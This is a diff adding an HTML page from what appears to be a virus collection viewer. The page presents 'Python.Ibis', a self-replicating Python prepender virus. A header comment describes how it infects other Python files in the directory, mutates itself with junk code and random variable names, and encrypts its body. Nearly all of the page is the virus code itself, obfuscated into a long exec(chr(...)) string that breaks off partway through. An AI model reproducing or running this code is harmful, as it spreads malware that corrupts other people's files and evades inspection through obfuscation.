@@ -1,0 +1,230 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html>
+<head>
+
+<link href="../../viewer/css/style2.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<div class="menu">
+<div class="menuitem"><a href="../../viewer/html/sources.html">Return to previous menu</a></div>
+<div class="menuitem"><a target="_blank" href="./ibis">Navigate to project folder</a></div>
+
+</div>
+
+<div class="title">Python.Ibis<br/></div>
+<div class="author">Mike_Hood<br/></div>
+
+
+<xmp>
+
+# Name  : Ibis
+# Type  : Polymorphic, encrypted prepender
+# Author: Mike_Hood
+
+# Description: Ibis works in a simple way: searches for uninfected python files in the 
+#              current directory, decrypts its own code and replaces all the garbage
+#              instructions with a random number of instructions in random lines
+#              of the code, respecting indentation. It changes also the name of 
+#              the variables with random names.
+#              At last Ibis encrypts itself with a simple ASCII encryption and writes
+#              its own code before its victim.
+
+# Thanks to: WarGame and other people.
+
+# Encrypted code #################################################
+
+exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(115)+chr(121)+chr(115)+chr(44)+chr(32)+chr(103)+chr(108)+chr(111)+chr(98)+chr(10)+chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(111)+chr(115)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(114)+chr(101)+chr(109)+chr(111)+chr(118)+chr(101)+chr(10)+chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(115)+chr(116)+chr(114)+chr(105)+chr(110)+chr(103)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(42)+chr(10)+chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(114)+chr(101)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(42)+chr(10)+chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(114)+chr(97)+chr(110)+chr(100)+chr(111)+chr(109)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(42)+chr(10)+chr(100)+chr(101)+chr(102)+chr(32)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(105)+chr(111)+chr(110)+chr(40)+chr(41)+chr(58)+chr(10)+chr(9)+chr(109)+chr(121)+chr(115)+chr(111)+chr(117)+chr(108)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(115)+chr(121)+chr(115)+chr(46)+chr(97)+chr(114)+chr(103)+chr(118)+chr(91)+chr(48)+chr(93)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(61)+chr(109)+chr(121)+chr(115)+chr(111)+chr(117)+chr(108)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(108)+chr(105)+chr(110)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(109)+chr(121)+chr(115)+chr(111)+chr(117)+chr(108)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(61)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(91)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(44)+chr(34)+chr(101)+chr(118)+chr(97)+chr(108)+chr(40)+chr(34)+chr(41)+chr(43)+chr(54)+chr(58)+chr(93)+chr(10)+chr(9)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(61)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(91)+chr(58)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(44)+chr(34)+chr(41)+chr(41)+chr(34)+chr(41)+chr(43)+chr(49)+chr(93)+chr(10)+chr(9)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(61)+chr(115)+chr(112)+chr(108)+chr(105)+chr(116)+chr(40)+chr(34)+chr(92)+chr(43)+chr(34)+chr(44)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(44)+chr(48)+chr(41)+chr(10)+chr(9)+chr(84)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(119)+chr(34)+chr(41)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(84)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(99)+chr(104)+chr(114)+chr(40)+chr(111)+chr(114)+chr(100)+chr(40)+chr(101)+chr(118)+chr(97)+chr(108)+chr(40)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(91)+chr(105)+chr(93)+chr(41)+chr(41)+chr(41)+chr(41)+chr(10)+chr(9)+chr(84)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(100)+chr(101)+chr(102)+chr(32)+chr(69)+chr(110)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(105)+chr(111)+chr(110)+chr(40)+chr(41)+chr(58)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(61)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(61)+chr(91)+chr(48)+chr(93)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(41)+chr(45)+chr(49)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(91)+chr(108)+chr(101)+chr(110)+chr(40)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(41)+chr(58)+chr(93)+chr(61)+chr(91)+chr(48)+chr(93)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(91)+chr(105)+chr(93)+chr(61)+chr(34)+chr(99)+chr(104)+chr(114)+chr(40)+chr(34)+chr(43)+chr(115)+chr(116)+chr(114)+chr(40)+chr(111)+chr(114)+chr(100)+chr(40)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(91)+chr(105)+chr(93)+chr(41)+chr(41)+chr(43)+chr(34)+chr(41)+chr(43)+chr(34)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(119)+chr(34)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(34)+chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(34)+chr(41)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(105)+chr(61)+chr(61)+chr(108)+chr(101)+chr(110)+chr(40)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(41)+chr(45)+chr(49)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(61)+chr(115)+chr(116)+chr(114)+chr(40)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(91)+chr(105)+chr(93)+chr(41)+chr(10)+chr(9)+chr(9)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(91)+chr(58)+chr(108)+chr(101)+chr(110)+chr(40)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(41)+chr(45)+chr(49)+chr(93)+chr(41)+chr(10)+chr(9)+chr(9)+chr(101)+chr(108)+chr(115)+chr(101)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(115)+chr(116)+chr(114)+chr(40)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(91)+chr(105)+chr(93)+chr(41)+chr(41)+chr(9)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(34)+chr(41)+chr(34)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(61)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(61)+chr(115)+chr(117)+chr(98)+chr(40)+chr(34)+chr(92)+chr(43)+chr(99)+chr(104)+chr(114)+chr(92)+chr(40)+chr(49)+chr(51)+chr(92)+chr(41)+chr(34)+chr(44)+chr(34)+chr(34)+chr(44)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(41)+chr(10)+chr(9)+chr(114)+chr(101)+chr(109)+chr(111)+chr(118)+chr(101)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(41)+chr(10)+chr(9)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(72)+chr(111)+chr(115)+chr(116)+chr(102)+chr(105)+chr(108)+chr(101)+chr(115)+chr(44)+chr(34)+chr(119)+chr(98)+chr(34)+chr(41)+chr(9)+chr(10)+chr(9)+chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(61)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(43)+chr(34)+chr(92)+chr(110)+chr(35)+chr(73)+chr(66)+chr(73)+chr(83)+chr(92)+chr(110)+chr(34)+chr(43)+chr(72)+chr(67)+chr(111)+chr(100)+chr(101)+chr(9)+chr(10)+chr(9)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(41)+chr(10)+chr(9)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(100)+chr(101)+chr(102)+chr(32)+chr(78)+chr(101)+chr(119)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(40)+chr(41)+chr(58)+chr(10)+chr(9)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(32)+chr(61)+chr(32)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(57)+chr(55)+chr(44)+chr(49)+chr(50)+chr(50)+chr(41)+chr(41)+chr(10)+chr(9)+chr(105)+chr(102)+chr(32)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(67)+chr(111)+chr(100)+chr(101)+chr(44)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(41)+chr(33)+chr(61)+chr(45)+chr(49)+chr(58)+chr(10)+chr(9)+chr(9)+chr(78)+chr(101)+chr(119)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(101)+chr(108)+chr(115)+chr(101)+chr(58)+chr(10)+chr(9)+chr(9)+chr(114)+chr(101)+chr(116)+chr(117)+chr(114)+chr(110)+chr(32)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(10)+chr(100)+chr(101)+chr(102)+chr(32)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(67)+chr(108)+chr(101)+chr(97)+chr(110)+chr(101)+chr(114)+chr(40)+chr(41)+chr(58)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(61)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(61)+chr(115)+chr(112)+chr(108)+chr(105)+chr(116)+chr(40)+chr(34)+chr(92)+chr(110)+chr(34)+chr(44)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(44)+chr(48)+chr(41)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(105)+chr(93)+chr(44)+chr(83)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(48)+chr(93)+chr(41)+chr(33)+chr(61)+chr(45)+chr(49)+chr(32)+chr(111)+chr(114)+chr(32)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(105)+chr(93)+chr(44)+chr(83)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(49)+chr(93)+chr(41)+chr(33)+chr(61)+chr(45)+chr(49)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(105)+chr(93)+chr(61)+chr(34)+chr(42)+chr(34)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(119)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(105)+chr(93)+chr(33)+chr(61)+chr(34)+chr(42)+chr(34)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(105)+chr(93)+chr(43)+chr(34)+chr(92)+chr(110)+chr(34)+chr(41)+chr(10)+chr(9)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(100)+chr(101)+chr(102)+chr(32)+chr(78)+chr(101)+chr(119)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(40)+chr(41)+chr(58)+chr(10)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(49)+chr(44)+chr(50)+chr(48)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(61)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(61)+chr(115)+chr(112)+chr(108)+chr(105)+chr(116)+chr(40)+chr(34)+chr(92)+chr(110)+chr(34)+chr(44)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(44)+chr(48)+chr(41)+chr(10)+chr(9)+chr(9)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(61)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(41)+chr(45)+chr(49)+chr(41)+chr(10)+chr(9)+chr(9)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(61)+chr(48)+chr(10)+chr(9)+chr(9)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(61)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(91)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(93)+chr(10)+chr(9)+chr(9)+chr(119)+chr(104)+chr(105)+chr(108)+chr(101)+chr(32)+chr(40)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(44)+chr(34)+chr(35)+chr(34)+chr(41)+chr(33)+chr(61)+chr(45)+chr(49)+chr(32)+chr(111)+chr(114)+chr(32)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(61)+chr(61)+chr(34)+chr(92)+chr(110)+chr(34)+chr(41)+chr(32)+chr(97)+chr(110)+chr(100)+chr(32)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(43)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(60)+chr(108)+chr(101)+chr(110)+chr(40)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(61)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(91)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(43)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(93)+chr(10)+chr(9)+chr(9)+chr(9)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(43)+chr(61)+chr(49)+chr(10)+chr(9)+chr(9)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(45)+chr(61)+chr(49)+chr(10)+chr(9)+chr(9)+chr(115)+chr(101)+chr(99)+chr(111)+chr(110)+chr(100)+chr(99)+chr(110)+chr(116)+chr(61)+chr(49)+chr(9)+chr(9)+chr(10)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(108)+chr(101)+chr(110)+chr(40)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(41)+chr(62)+chr(49)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(91)+chr(108)+chr(101)+chr(110)+chr(40)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(41)+chr(45)+chr(50)+chr(93)+chr(61)+chr(61)+chr(34)+chr(58)+chr(34)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(119)+chr(104)+chr(105)+chr(108)+chr(101)+chr(32)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(43)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(43)+chr(115)+chr(101)+chr(99)+chr(111)+chr(110)+chr(100)+chr(99)+chr(110)+chr(116)+chr(60)+chr(108)+chr(101)+chr(110)+chr(40)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(61)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(91)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(43)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(43)+chr(115)+chr(101)+chr(99)+chr(111)+chr(110)+chr(100)+chr(99)+chr(110)+chr(116)+chr(93)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(91)+chr(48)